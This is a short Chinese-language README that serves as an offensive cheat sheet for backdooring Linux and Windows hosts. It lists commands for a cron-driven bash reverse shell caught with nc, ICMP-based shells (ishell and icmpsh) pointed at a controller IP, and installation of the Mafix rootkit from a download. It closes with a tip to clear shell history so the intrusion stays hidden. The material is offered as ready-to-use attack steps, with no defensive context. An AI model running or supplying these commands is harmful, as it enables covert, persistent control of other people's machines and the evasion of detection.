# backdoor

****************************************************
1、 Bash TCP反弹后门<br>
bash_tcp_backdoor.sh<br>
vim /etc/crontab<br>
*/1 * * * * root /root/ok.sh<br>
或<br>
crontab -e<br>
*/1 * * * *  /root/ok.sh<br>
systemctl restart crond<br>
控制机执行<br>
nc -l -v -p 5353

****************************************************
2、icmp shell无端口后门<br>
原文：https://www.cnblogs.com/bravexz/p/9761411.html<br>
wget http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz<br>
tar -zxvf ish-v0.2.tar.gz<br>
cd ISHELL-v0.2/<br>
make && make linux<br>
make linux<br>
肉鸡192.168.1.28上执行命令：<br>
./ishd -i 555 -t 0 -p 1099 &<br>
控制机执行：<br>
./ish -i 555 -t 0 -p 1099 192.168.1.28<br>
命令解释：<br>
-i 指定ID，标识自己的请求<br>
-t 指定icmp数据的类型 <br>
-p 指定 icmp 数据 包大小 ,一般 情况下 1024 即可<br>

****************************************************
3、icmpsh后门<br>
pip install impacket<br>
git clone https://github.com/inquisb/icmpsh.git<br>
cd icmpsh<br>
./run.sh<br>
控制端运行：<br>
python icmpsh_m.py 192.168.1.28 192.168.1.41<br>
#./icmpsh-m.py <控制机IP> <肉鸡IP><br>
sz icmpsh.exe到本地<br>
C:\>icmpsh.exe -t 192.168.1.28 -d 600 -b 20 -s 256   //指向控制机<br>

https://blog.csdn.net/Fly_hps/article/details/80627628<br>
https://www.jianshu.com/p/3bdf8c5557e8<br>
https://www.cnblogs.com/bravexz/p/9761411.html<br>
https://github.com/sevck/icmp_Tunnel<br>
https://blog.csdn.net/qq_33020901/article/details/81773737<br>

4、mafix.tar.gz  rootkit后门<br>
Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现让攻击者远程登陆的，特点是配置简单并可以自定义验证密码和端口号。
kali 下测试通过，centos7不兼容<br>
wget https://github.com/synjkc/backdoor/blob/master/mafix.tar.gz<br>
tar -zxvf mafix.tar.gz<br>
cd mafix<br>
./root xiaoma 9999<br>

安装rootkit 命令：./root 密码  端口   (如: ./root xiaoma 9999  接着用ssh连接它的9999端口，用户名是root，密码为xiaoma)
安装完成后会自动删除目录，为了隐蔽，用 history -c 清除下命令就行了<br>
控制端执行： ssh romote_ip -p9999
